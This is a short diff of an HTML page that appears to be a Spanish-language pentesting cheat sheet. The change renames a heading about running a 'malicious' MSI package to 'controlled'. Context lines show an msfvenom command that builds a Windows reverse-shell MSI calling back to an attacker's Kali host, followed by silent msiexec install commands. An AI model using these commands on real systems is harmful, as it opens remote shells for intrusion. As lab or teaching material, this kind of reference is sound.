@@ -62,7 +62,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=&lt;kali_ip&gt; LPORT=443 -f msi -o 
             </section>
 
             <section class="code-card">
-              <h3>PowerShell: Ejecutar paquete malicioso</h3>
+              <h3>PowerShell: Ejecutar paquete MSI controlado</h3>
               <pre><code>msiexec /i rev.msi # Opción 1
 msiexec /quiet /qn /i rev.msi # Opción 2
 msiexec /i c:\users\desktop\rev.msi /quiet /qn /norestart # Opción 3</code></pre>
